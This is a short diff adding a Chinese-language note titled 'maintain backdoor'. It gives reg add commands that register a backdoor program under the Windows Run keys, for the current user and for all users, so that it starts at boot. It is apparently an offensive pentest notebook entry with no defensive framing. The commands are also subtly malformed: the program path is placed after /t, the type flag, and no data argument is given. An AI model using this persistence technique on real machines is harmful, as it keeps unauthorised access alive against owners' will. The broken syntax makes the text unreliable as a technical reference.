@@ -1,0 +1,8 @@
+维持后门
+
+修改注册表
+
+针对当前用户的开机自启
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v 项名 /t 后门程序路径
+针对所有用户
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 项名 /t 后门程序路径
